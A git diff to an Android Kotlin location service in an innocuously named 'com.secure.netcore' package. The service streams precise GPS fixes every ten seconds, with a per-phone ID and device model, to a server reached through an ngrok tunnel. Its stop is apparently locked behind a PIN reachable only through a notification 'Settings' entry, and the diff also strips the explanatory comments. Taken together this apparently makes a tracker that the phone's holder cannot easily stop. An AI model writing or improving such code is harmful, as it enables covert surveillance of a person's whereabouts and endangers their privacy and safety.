@@ -57,14 +57,26 @@ class LocationService : Service() {
         const val NOTIFICATION_ID = 42
         const val ACTION_STOP = "com.secure.netcore.STOP"
 
-        // ===== АДРЕС ИЗ ТУННЕЛЯ (cloudflared / ngrok) =====
-        // Пример: "https://xxxx.trycloudflare.com"  (без слэша в конце)
         const val SERVER_URL = "https://punctured-detail-expansive.ngrok-free.dev"
 
-        const val DEVICE_ID = "device-001"
-        const val UPDATE_MS = 10_000L   // геолокация каждые 10 секунд
-        const val BATCH_MS = 10_000L    // отправка каждые 10 секунд
+        const val UPDATE_MS = 10_000L
+        const val BATCH_MS = 10_000L
+        const val MAX_ACCURACY_M = 30f // точки хуже 30 м не берём (если есть лучше)
     }
+
+    // Уникальный ID телефона
+    private fun deviceId(): String {
+        val prefs = getSharedPreferences("cfg", MODE_PRIVATE)
+        var id = prefs.getString("device_id", null)
+        if (id == null) {
+            id = "phone-" + (1000..9999).random()
+            prefs.edit().putString("device_id", id).apply()
+        }
+        return id
+    }
+
+    // Модель телефона
+    private fun deviceModel(): String = "${Build.MANUFACTURER} ${Build.MODEL}"
 
     private val locationCallback = object : LocationCallback() {
         override fun onLocationResult(result: LocationResult) {
@@ -79,7 +91,6 @@ class LocationService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // если PIN уже введён — не перезапускаться
         if (getSharedPreferences("cfg", MODE_PRIVATE).getBoolean("unlocked", false)) {
             stopSelf()
             return START_NOT_STICKY
@@ -96,7 +107,6 @@ class LocationService : Service() {
     }
 
     private fun startForegroundWithType() {
-        // «Настройки» в уведомлении — единственный путь к PIN-коду
         val settingsIntent = Intent(this, PinActivity::class.java)
         val settingsPending = PendingIntent.getActivity(
             this, 0, settingsIntent,
@@ -125,7 +135,9 @@ class LocationService : Service() {
         if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION)
             != PackageManager.PERMISSION_GRANTED) return
         val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, UPDATE_MS)
+            .setMinUpdateIntervalMillis(2000L)
             .setMinUpdateDistanceMeters(0f)
+            .setWaitForAccurateLocation(true) // ждём точный фикс, а не первый попавшийся
             .build()
         fused.requestLocationUpdates(request, locationCallback, Looper.getMainLooper())
     }
@@ -148,17 +160,22 @@ class LocationService : Service() {
             batch = ArrayList(buffer)
             buffer.clear()
         }
+        // ТОЧНОСТЬ: из пачки фиксов берём самый точный;
+        // грубые (хуже MAX_ACCURACY_M) — только если других нет
+        val accurate = batch.filter { it.hasAccuracy() && it.accuracy <= MAX_ACCURACY_M }
+        val pool = if (accurate.isNotEmpty()) accurate else batch
+        val best = pool.minByOrNull { if (it.hasAccuracy()) it.accuracy else 9999f } ?: return
+
         val arr = JSONArray()
-        for (loc in batch) {
-            arr.put(
-                JSONObject()
-                    .put("device_id", DEVICE_ID)
-                    .put("lat", loc.latitude)
-                    .put("lon", loc.longitude)
-                    .put("accuracy", loc.accuracy.toDouble())
-                    .put("speed", (loc.speed * 3.6))
-            )
-        }
+        arr.put(
+            JSONObject()
+                .put("device_id", deviceId())
+                .put("device_model", deviceModel())
+                .put("lat", best.latitude)
+                .put("lon", best.longitude)
+                .put("accuracy", best.accuracy.toDouble())
+                .put("speed", (best.speed * 3.6))
+        )
         val body = arr.toString().toRequestBody("application/json".toMediaType())
         val request = Request.Builder()
             .url("$SERVER_URL/points")
